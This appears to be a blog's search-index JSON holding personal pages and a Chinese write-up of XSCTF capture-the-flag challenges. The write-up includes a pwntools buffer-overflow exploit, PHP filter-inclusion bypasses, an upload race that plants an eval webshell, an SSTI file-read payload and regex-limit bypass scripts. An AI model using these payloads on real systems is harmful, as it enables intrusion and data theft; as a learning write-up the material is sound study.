{"meta":{"title":"Uniqueland","subtitle":"--XsRan's Personal Blog","description":"","author":"XsRan","url":"http://uniqueland.top","root":"/"},"pages":[{"title":"来了","date":"2020-11-09T14:06:06.735Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/ToXiaowei.html","permalink":"http://uniqueland.top/Eastereggs/ToXiaowei.html","excerpt":"","text":"http://uniqueland.top/Eastereggs/Class17"},{"title":"Categories","date":"2020-05-10T05:33:34.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"categories/index.html","permalink":"http://uniqueland.top/categories/index.html","excerpt":"","text":""},{"title":"sitemap","date":"2020-05-10T05:34:11.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Sitemap/index.html","permalink":"http://uniqueland.top/Sitemap/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-05-10T05:33:14.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"about/index.html","permalink":"http://uniqueland.top/about/index.html","excerpt":"","text":"第一次搭建网站也不知道在“关于”版块写什么，就留个微信吧，有路过的想交个朋友的可以加微信交流一下。微信ID：KID3317"},{"title":"Schedule","date":"2020-05-10T05:33:53.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"schedule/index.html","permalink":"http://uniqueland.top/schedule/index.html","excerpt":"","text":""},{"title":"","date":"2021-04-24T14:21:13.884Z","updated":"2021-04-24T14:21:13.884Z","comments":true,"path":"hidden/resources.html","permalink":"http://uniqueland.top/hidden/resources.html","excerpt":"","text":"图片类 Wallhaven Pixabay Pngimg Pexels Unsplash Foodies 音效类 爱给网 字体类 字体天下 猫啃网 求字体 字由 100font 可商用字体查询 影视类 真不卡影视 独播库 91美剧网 色彩类 colorhunt Coolors Palettable PPT类 PPT宝藏 PPT超级市场 优品PPT 图标类 阿里巴巴矢量图标库 Iconstore 插画制作工具 视频类 Videezy Videvo Mixkit Distill 蓝光网 综合类 Anyknew Topbook"},{"title":"","date":"2022-03-26T11:52:57.162Z","updated":"2022-03-26T11:52:57.162Z","comments":true,"path":"hidden/ctf_resources.html","permalink":"http://uniqueland.top/hidden/ctf_resources.html","excerpt":"","text":"理论知识 CTFHUB 看雪知识库 CheatSheet CTF-WIKI 先知社区 安全客 洞悉漏洞 先知社区_XXE Freebuf_Web 实践平台 BUUCTF 攻防世界 Bugku 二进制_cy 综合 来自xPoint学长的分享"},{"title":"所有标签","date":"2021-11-07T15:49:01.532Z","updated":"2020-11-28T16:21:57.445Z","comments":true,"path":"tags/index.html","permalink":"http://uniqueland.top/tags/index.html","excerpt":"","text":""},{"title":"彩蛋","date":"2020-11-09T14:06:06.755Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Drafts/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Drafts/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) 由于展示图片较多，建议等待十秒再浏览，效果更佳。 镇楼 百日誓师 高二运动会 高三运动会 个人特写 彩蛋中的彩蛋 日常 高一 合照 待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog2020.05.25 首次部署2020.05.27 更换主题2020.05.28 部署过程出现错误，重装系统2020.06.01 贴图图床出现问题，更换图床2020.06.14 图床再次出现问题，使用微博作为临时图床，补充图片"},{"title":"彩蛋","date":"2020-11-10T03:26:46.695Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) ,注意：此链接为内部链接，没有链接的人进不来，无需担心隐私泄漏。 镇楼百日誓师高二运动会高三运动会个人特写彩蛋中的彩蛋日常高一合照 关于个人照片如有因各种原因而不愿意展示图片的同学请与我联系如有想添加图片的同学也请与我联系，乐意至极待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…终究还是逃不过制作子网页… 由于先前只有一个网页，故图片展示数量有限。现在…增加子网页的图片由于图床原因故待排版关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog首次部署更换主题部署过程出现错误，重装系统贴图图床出现问题，更换图床图床再次出现问题，使用微博作为临时图床，补充图片由于图片过多，不得不分为数个子网页…图床再再再次出现问题，所有网页 推 倒 重 做再次排版添加图片，略作排版"},{"title":"彩蛋中的彩蛋","date":"2020-11-09T14:06:06.748Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Eastereggs.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Eastereggs.html","excerpt":"","text":"日常"},{"title":"个人特写","date":"2020-11-10T05:16:37.169Z","updated":"2020-11-10T05:16:37.168Z","comments":true,"path":"Eastereggs/Class17/Closeup.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Closeup.html","excerpt":"","text":"感谢高中有你们 (谁有珠姐和马老师的照片提供一下嘛…凑齐召唤神龙) 彩蛋中的彩蛋"},{"title":"高一","date":"2020-11-09T14:06:06.751Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade1.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade1.html","excerpt":"","text":"合照"},{"title":"高二运动会","date":"2020-11-09T14:06:06.743Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade2.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade2.html","excerpt":"","text":"!s 高三运动会"},{"title":"高三运动会","date":"2020-11-09T14:06:06.745Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade3.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade3.html","excerpt":"","text":"个人特写"},{"title":"日常","date":"2020-11-09T14:06:06.750Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Routine.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Routine.html","excerpt":"","text":"高一"},{"title":"镇楼","date":"2020-11-09T14:06:06.741Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Starting.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Starting.html","excerpt":"","text":"百日誓师"},{"title":"","date":"2020-11-10T02:28:15.625Z","updated":"2020-09-28T11:51:06.000Z","comments":true,"path":"Eastereggs/JNU2020/记暨大新训.html","permalink":"http://uniqueland.top/Eastereggs/JNU2020/%E8%AE%B0%E6%9A%A8%E5%A4%A7%E6%96%B0%E8%AE%AD.html","excerpt":"","text":"记暨大新训帅气昊哥在线演唱 随拍 在线征集文案…"},{"title":"成人礼 & 誓师","date":"2020-11-09T14:06:06.742Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Oath.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Oath.html","excerpt":"","text":"高二运动会"},{"title":"合照","date":"2020-11-10T05:15:55.270Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Groupphotos.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Groupphotos.html","excerpt":"","text":"聚是一团火，散是满天星。十七班的各位兄弟姐妹们，我们有缘，江湖再见！ 返回"}],"posts":[{"title":"XSCTF_warmup","slug":"xsctf_warmup","date":"2024-11-04T15:29:52.430Z","updated":"2024-11-05T05:48:49.466Z","comments":true,"path":"2024/11/04/xsctf_warmup/","link":"","permalink":"http://uniqueland.top/2024/11/04/xsctf_warmup/","excerpt":"","text":"babystack附件：babystack 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [rsp+Eh] [rbp-2h] init_func(argc, argv, envp); start_show(); puts(&amp;s); __isoc99_scanf(v4); vuln(v4); return 0;&#125;ssize_t __fastcall vuln(unsigned int a1)&#123; char buf[80]; // [rsp+10h] [rbp-50h] BYREF if ( a1 &lt;= 0x7FFFFFFE ) &#123; printf(format); exit(0); &#125; puts(&amp;byte_402038); puts(&amp;byte_40205D); return read(0, buf, 0x8848uLL);&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; 对于第一个比较，直接输入-1 对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可 exp 12345678910111213from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)sysaddr = elf.symbols[&#x27;backdoor&#x27;]print(&#x27;0x%x&#x27;%sysaddr)r.recv()r.sendline(b&#x27;-1&#x27;)r.recv()r.sendline(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(sysaddr))r.interactive() 正常来说这么写没问题，但是运行的时候不会返回shell原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作 exp 1234567891011from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)r.recv()r.sendline(b&#x27;-1&#x27;)sleep(2)r.send(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(0x4012bf))r.interactive() 坑 当返回到后门函数行不通的时候，返回到调用system函数的语句 Windows和Linux平台运行同一份exp的结果可能不同 XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125; Badbad_filenameGET me a filename and I&#39;ll include it!测试一下发现过滤了php、filter、base、data、file等关键字然后就搜一堆绕过的方法 如果base被绕过了，可以使用url编码convert往后，resource往前的字符?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource= 除了测试文件/etc/passwd之外，如果是nginx，可以考虑读日志/var/log/nginx/access.log 如果读flag.php，记得先访问一下看看页面是否存在 最后，这道题的解法是最简单的双写绕过?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125; 麻了 canyoupassit1234567891011121314151617181920&lt;?php highlight_file(__FILE__); error_reporting(0); if ($_POST[&#x27;a1&#x27;] != $_POST[&#x27;b1&#x27;] &amp;&amp; md5($_POST[&#x27;a1&#x27;] == md5($_POST[&#x27;b1&#x27;])))&#123; echo &quot;恭喜你过了第一关!&quot;; &#125; else &#123; die(&quot;就这?&quot;); &#125; if ($_POST[&#x27;key&#x27;] == md5($_POST[&#x27;key&#x27;])) &#123; echo &quot;恭喜你过了第二关!&quot;; &#125; else &#123; die(&quot;再看看?&quot;); &#125; $now = time(); if ($_POST[&#x27;a2&#x27;] != $_POST[&#x27;b2&#x27;] &amp;&amp; str_starts_with($_POST[&#x27;a2&#x27;], $now) &amp;&amp; str_starts_with($_POST[&#x27;b2&#x27;], $now) &amp;&amp; md5($_POST[&#x27;a2&#x27;] === md5($_POST[&#x27;b2&#x27;])))&#123; echo &quot;恭喜你过了第三关!&quot;; include &quot;/flag&quot;; &#125; else &#123; die(&quot;真可惜，就差最后一步了&quot;); &#125; 这是一道有关md5绕过的题目，主要分为三个部分 不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞 md5值等于自身的值（弱比较） – 0e绕过 不同值的md5是一样的（强比较），且要求两个值都有特定前缀 解决的方法如下： 对于弱比较的md5值，可以直接百度特定的值 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等 对于若比较的$a == md5($a)，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如0e215962017 对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用fastcoll工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间 1234567891011121314151617181920212223242526272829import requestsimport osimport timet = int(time.time()+10)with open(&#x27;t.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(t))os.system(&quot;fastcoll_v1.0.0.5.exe t.txt&quot;)a2 = open(&#x27;t_msg1.txt&#x27;, &#x27;rb&#x27;).read()b2 = open(&#x27;t_msg2.txt&#x27;, &#x27;rb&#x27;).read()url = &quot;http://43.248.97.213:30038/&quot;data = &#123; &#x27;a1&#x27;: &#x27;s214587387a&#x27;, &#x27;b1&#x27;: &#x27;s155964671a&#x27;, &#x27;key&#x27; : &#x27;0e215962017&#x27;, &#x27;a2&#x27;: a2, &#x27;b2&#x27;: b2,&#125;while 1: res = requests.post(url, data=data) if &#x27;flag&#123;&#x27; in res.text: print(res.text) break 一些要注意的点 特定前缀的时间最好往后调一调，避免因网络问题导致错过时间 生成的两个txt需要以二进制的形式读取 flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125; Ezgame进入是一个小游戏，要求达到非常高的分数 直接玩肯定不现实，于是翻翻js代码因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数 入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些 看起来像是存储游戏角色的变量于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了) 1&#123;&quot;id&quot;:&quot;o1&quot;,&quot;ownerId&quot;:null,&quot;position&quot;:&#123;&quot;x&quot;:359.04999999999956,&quot;y&quot;:154.2499999999999&#125;,&quot;size&quot;:&#123;&quot;width&quot;:32,&quot;height&quot;:32&#125;,&quot;direction&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;facing&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;speed&quot;:150,&quot;team&quot;:0,&quot;hitPoints&quot;:100,&quot;damage&quot;:0,&quot;spriteSheet&quot;:&quot;characters&quot;,&quot;spriteX&quot;:0,&quot;spriteY&quot;:992,&quot;spriteAlign&quot;:false,&quot;animated&quot;:true,&quot;animFrameIndex&quot;:0,&quot;animNumFrames&quot;:2,&quot;animDelay&quot;:200,&quot;animElapsed&quot;:16,&quot;spawnFrameIndex&quot;:0,&quot;spawnFrameCount&quot;:2,&quot;spawnFramesX&quot;:0,&quot;spawnFramesY&quot;:0,&quot;angle&quot;:0,&quot;rotateSpeed&quot;:400,&quot;rotate&quot;:false,&quot;worth&quot;:0,&quot;ttl&quot;:0,&quot;ttlElapsed&quot;:0,&quot;alpha&quot;:1,&quot;alphaMod&quot;:-1,&quot;gibletSize&quot;:&quot;small&quot;,&quot;cooldown&quot;:false,&quot;cooldownElapsed&quot;:0,&quot;autoFire&quot;:false,&quot;soundAttacks&quot;:&quot;hero_attacks&quot;,&quot;soundDamage&quot;:&quot;hero_damage&quot;,&quot;soundDies&quot;:&quot;hero_dies&quot;,&quot;alive&quot;:true,&quot;states&quot;:[&#123;&quot;type&quot;:0,&quot;timer&quot;:&#123;&quot;elapsed_ms&quot;:43298,&quot;ttl&quot;:0&#125;&#125;,null,null],&quot;currentWeaponIndex&quot;:1,&quot;collidable&quot;:true,&quot;bounce&quot;:true,&quot;piercing&quot;:false,&quot;achievementId&quot;:null,&quot;deathsForAchievement&quot;:null,&quot;ignoreLogDeath&quot;:false,&quot;damageType&quot;:null,&quot;drawIndex&quot;:1,&quot;moveChangeElapsed&quot;:0,&quot;moveChangeDelay&quot;:500,&quot;wounds&quot;:15,&quot;weapons&quot;:[&#123;&quot;type&quot;:&quot;h_sword&quot;,&quot;count&quot;:null&#125;,&#123;&quot;type&quot;:&quot;h_spear&quot;,&quot;count&quot;:82&#125;],&quot;gold&quot;:1000000000,&quot;kills&quot;:10000000000,&quot;timesWounded&quot;:1,&quot;totalDamageTaken&quot;:15,&quot;shotsFired&quot;:108,&quot;shotsLanded&quot;:65,&quot;shotsPerWeapon&quot;:&#123;&quot;h_sword&quot;:28,&quot;h_knife&quot;:31,&quot;h_spear&quot;:18&#125;,&quot;meatEaten&quot;:0,&quot;cheater&quot;:false,&quot;phase&quot;:0,&quot;phaseInit&quot;:false,&quot;lootTable&quot;:[],&quot;killSwitch&quot;:false,&quot;type&quot;:&quot;hero&quot;,&quot;role&quot;:&quot;hero&quot;,&quot;isMeatboy&quot;:false,&quot;bloodTimer&quot;:null&#125; 然后返回游戏发现数据没有变化以为错了，退出去，然后在主界面发现了flag flag&#123;basju_D0G006706_iajdisaia&#125; hardphp进入题目什么都没有，只有一句话尝试大声喊出v我50!!!我就会给你flag只能扫后台了 12345678910111213141516171819202122232425262728293031323334353637~$ dirsearch -u http://43.248.97.213:30090/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txtError Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.logTarget: http://43.248.97.213:30090/[22:14:33] Starting:[22:14:37] 403 - 223B - /.htaccess.orig[22:14:37] 403 - 225B - /.htaccess.sample[22:14:37] 403 - 223B - /.htaccess.bak1[22:14:37] 403 - 220B - /.ht_wsr.txt[22:14:37] 403 - 223B - /.htaccess.save[22:14:37] 403 - 224B - /.htaccess_extra[22:14:38] 403 - 221B - /.htaccess_sc[22:14:38] 403 - 223B - /.htaccess_orig[22:14:38] 403 - 214B - /.html[22:14:38] 403 - 219B - /.htpasswds[22:14:38] 403 - 221B - /.htaccessBAK[22:14:38] 403 - 221B - /.htaccessOLD[22:14:38] 403 - 213B - /.htm[22:14:38] 403 - 222B - /.htaccessOLD2[22:14:38] 403 - 220B - /.httr-oauth[22:14:38] 403 - 223B - /.htpasswd_test[22:15:05] 200 - 304B - /index.php[22:15:05] 200 - 304B - /index.php/login/[22:15:17] 403 - 222B - /server-status[22:15:17] 403 - 223B - /server-status/[22:15:25] 200 - 825B - /www.zipTask Completed 扫出来三个，其中www.zip是网站的备份解压之后发现有个flagflaghhh.php 12345678910111213141516&lt;?php error_reporting(0); highlight_file(__FILE__); $input = $_POST[&#x27;a&#x27;]; if (isset($input)) &#123; if (substr($input, 0, 5) == &quot;vme50&quot; and substr($input, -1, 1) == &quot;!&quot;) &#123; if ($input == &quot;vme50!&quot;) &#123; die(&quot;Speak a little louder, I can&#x27;t hear you!&quot;); &#125; if (preg_match(&#x27;/vme50.+?!/is&#x27;, $input)) &#123; die(&quot;xing bu xing a.Speak much louder!&quot;); &#125; system(&quot;cat /flag&quot;); &#125; else echo &quot;Bie lai zhan bian!!!&quot;; &#125; 对传入的a参数有三个条件 以vme50为开头，以感叹号为末尾 不可以是vme50 不可以满足正则表达式/vme50.+?!/is，该正则表达式的意思是匹配以vme50开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败 /：正则表达式的开始和结束标记。 vme50：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。 .：点号（.）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。 +：加号（+）表示前面的字符（在这个例子中是点号 .）出现一次或多次。 ?：问号（?）在这里与 + 结合使用，表示前面的字符（点号 .）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。 !：感叹号（!）在这里是一个普通字符，表示匹配文本中包含 ! 的部分。 /is：这是正则表达式的修饰符部分，i 表示不区分大小写，s 表示点号 . 可以匹配任意字符，包括换行符。 仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万所以 1234567891011import requestsurl = &quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;data = &#123; #&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100 &#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;0&#x27;*1000000+&#x27;!&#x27;&#125;res = requests.post(url=url, data=data)print(res.text) flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125; KFC 主要考点：HTTP header各字段的含义及格式 进入题目连接，除了一张无意义的图片之外就是Are you come from localhost?猜测修改XFF，即X-Forwarded-For: 127.0.0.1 发包返回Are you jump from KFC&#39;s website?(http:****.cn)猜测修改Referer，搜索kfc的网址https://kfcapp.cn/，即Referer: https://kfcapp.cn/ 发包返回Have you v me 50?这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段 123456789101112HTTP&#x2F;1.1 200 OKDate: Sat, 26 Oct 2024 17:57:44 GMTServer: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45X-Powered-By: PHP&#x2F;5.4.45money: 0Vary: Accept-EncodingContent-Length: 106Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50? 故猜测在header增加一个money的字段，值为50，即money: 50 flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; kk园区审核员善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！ 填表 - 提交 - 审核cookie猜测是xss cookie外带 找xss平台 复制payload并填表 提交并返回xss平台看记录 XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com) reallyExpensive给了十块钱的余额要买好贵的flag抓包改购买的数目 flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125; upload_quick进入页面什么也干不了，没有找到文件上传的路径文件上传的页面藏在js文件里 根据题目猜测条件竞争 123456789101112131415161718192021222324252627POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1Host: 43.248.97.213:30014Content-Length: 331Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0Origin: http:&#x2F;&#x2F;43.248.97.213:30014Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcSAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242Connection: keep-alive------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;Content-Type: application&#x2F;octet-stream&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;submit&quot;ä¸ä¼ ------WebKitFormBoundaryY7TKFDA8ZwPEXpcS-- 重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了 flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125; 你买车票没题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）每次提交都会弹窗xxx,没买车票不能上车!!!但是在返回的页面中并没有看到js代码或者请求的js文件 一开始以为是使用php动态生成的js代码，但是没有思路后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用&#123;&#123; 4-1 &#125;&#125;这样的输入测试，如果返回3就说明存在ssti模板注入 确定了存在模板注入之后，还要确定怎么写payloadflask之ssti模版注入从零到入门 - 先知社区 (aliyun.com) payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数这里使用的payload：&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,\"/flag\")&#125;&#125; 一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是FileLoader XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125; 隐秘的backdoor12345678910&lt;?php error_reporting(0); highlight_file(__FILE__); $cmd = $_POST[&#x27;cmd&#x27;]; if(isset($_POST[&#x27;cmd&#x27;]))&#123; phpinfo(); die(&quot;不要这样！TuT&quot;); &#125; else &#123; $cmd = $_POST[&#x27;cmd&#x27;]; eval($cmd); &#125; ?&gt; 查询了很多绕过的方式，还是不行然后看了看php的版本，查到了这个版本的漏洞 具体上网搜 flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125; calculate查壳，发现upx，upx.exe -d calculate.exe然后扔进ida，发现这么一个函数 百度下叫约束求解（看起来有点像矩阵运算）1000多行手工提取不实际，写个脚本处理下 1234567891011121314151617with open(&#x27;asd.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()tmp = &#x27;&#x27;final = []for i in content: if &quot;return 0i64;&quot; not in i: tmp += i.strip() else: final.append(tmp) tmp = &#x27;&#x27;print(final)with open(&#x27;tmp1.txt&#x27;, &#x27;w&#x27;) as f: for i in final: f.write(i+&#x27;\\n&#x27;) 初步处理之后手动删去前后缀，就得到了公式（字符串版） 然后使用python中一个叫z3的库，专门用来求解这种方程组其中有一个方法可以将字符串版的方程转换为python可以处理的表达式 以下是一个模板 1234567891011121314151617181920212223242526from z3 import * def solver_eng(fc): # 创建解释器对象 solver = Solver() # 添加约束方程 for i in range(len(fc)): solver.add(eval(fc[i])) #eval函数会将字符串形式的方程转换为z3模块能解析的方程 # 求解并转化为字符输出，得到flag if solver.check() == sat: # check()方法用来判断是否有解，sat(即satisify)表示满足有解 ans = solver.model() # model()方法得到解 for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) # 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误 else: print(&quot;no ans!&quot;) if __name__ == &#x27;__main__&#x27;: # 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了） fc = [] # 创建未知数变量 v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) 根据题目修改一下 12345678910111213141516171819202122232425from z3 import *with open(&#x27;tmp1.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()def solver_eng(fc): solver = Solver() for i in range(len(fc)): solver.add(eval(fc[i])) if solver.check() == sat: ans = solver.model() for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) else: print(&#x27;Error&#x27;)if __name__ == &#x27;__main__&#x27;: fc = [] for i in content: fc.append(i.strip()) v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) flag&#123;n0w_y0u_know_UPX!&#125; z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客 call_above_call核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// bad sp value at call has been detected, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-90h] int v5; // [esp-10h] [ebp-8Ch] int v6; // [esp-Ch] [ebp-88h] int v7; // [esp-8h] [ebp-84h] int v8; // [esp-4h] [ebp-80h] int v9; // [esp+0h] [ebp-7Ch] int v10; // [esp+4h] [ebp-78h] int i; // [esp+4h] [ebp-78h] int v12; // [esp+8h] [ebp-74h] char s[100]; // [esp+Ch] [ebp-70h] BYREF unsigned int v14; // [esp+70h] [ebp-Ch] int *p_argc; // [esp+74h] [ebp-8h] p_argc = &amp;argc; v14 = __readgsdword(0x14u); v12 = generate(); printf(&quot;input your key:&quot;); ((void (__stdcall *)(const char *, char *, int, int, int, int, int, int, int, int))__isoc99_scanf)( &quot;%s&quot;, s, v4, v5, v6, v7, v8, 1, v10, v12); if ( strlen(s) != 25 ) &#123; printf(&quot;Sorry!&quot;); exit(0); &#125; wuhuwuhu((int)s); for ( i = 0; i &lt;= 24; ++i ) &#123; if ( s[i] != *(_BYTE *)(enc + i) ) &#123; v9 = 0; break; &#125; &#125; if ( v9 ) printf(&quot;Congratulations!&quot;); else printf(&quot;try again!&quot;); end_m(p_argc); return 0;&#125; 12345678int __cdecl wuhuwuhu(int a1)&#123; int i; // [esp+8h] [ebp-Ch] for ( i = 0; i &lt;= 23; ++i ) *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + 1 + a1); return a1;&#125; 主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试拿到目标数组后反过来异或就可以了 exp 1234567s = [0x0A, 0x0D, 0x06, 0x1C, 0x4B, 0x49, 0x17, 0x5A, 0x59, 0x04, 0x0A, 0x3C, 0x3B, 0x57, 0x51, 0x17, 0x12, 0x38, 0x26, 0x00, 0x1D, 0x17, 0x52, 0x5C, 0x7D]for i in range(len(s)): s[len(s)-2-i] = s[len(s)-2-i] ^ s[len(s)-1-i]for i in s: print(chr(i), end=&#x27;&#x27;) flag&#123;0yn4mic_d3bug_yyds!&#125; cube3题目描述 你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原 公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ 